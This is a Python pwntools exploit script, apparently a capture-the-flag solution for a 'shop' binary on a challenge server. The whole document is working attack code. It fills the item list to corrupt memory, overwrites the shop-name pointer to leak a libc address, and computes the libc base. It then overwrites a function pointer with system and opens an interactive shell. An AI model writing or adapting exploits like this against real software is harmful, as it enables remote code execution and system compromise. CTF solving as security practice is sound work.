from pwn import *

e = ELF('./shop')
libc = ELF('./libc.so.6')

if False:
    p = remote('localhost', 2323)
else:
    p = remote('shop.chal.pwning.xxx', 9916)

seq = open('seq.txt').read()


p.recvuntil(':')
p.sendline('shopname')

p.recvuntil('> ')

def add(name, desc, price):
    p.sendline('a')
    p.sendline(name)
    p.sendline(desc)
    p.sendline(str(price))
    p.recvuntil('> ')

def set_shop_name(name):
    p.sendline('n')
    p.recvuntil(':')
    p.send(name)
    p.recvuntil('> ')

def get_list():
    p.sendline('l')
    stuff = p.recvuntil('> ').split('\n')[:-1]
    return stuff

def checkout(s):
    p.sendline('c')
    p.sendline(s)
    name = p.recvuntil('Checkout')
    items = p.recvuntil('TOTAL').split('\n')[:-1]

    p.recvuntil('> ')
    return (name, items)

for _ in range(33):
    add('A'*30, 'B'*254, 0.01)

checkout(seq)

set_shop_name(p64(0x6020b4) + 'A'*(0x12f-8))
leak = get_list()[-1]

libc_leak = u64(leak.split(':')[0].ljust(8, '\x00'))
libc.address = libc_leak - libc.symbols['_IO_2_1_stdout_']

print(hex(libc.address))

set_shop_name(p64(0x602008) + 'C'*(0x12f-8))

buy = checkout(seq[:-10000] + p64(libc.address + 0x3e1870)[:4])
print(len(buy[1]))
assert len(buy[1]) == 34

p.sendline('n')
p.recvuntil(':')
p.sendline("sh" + '\x00'*6 + p64(0)*3 + p64(libc.symbols['system']))

p.interactive()
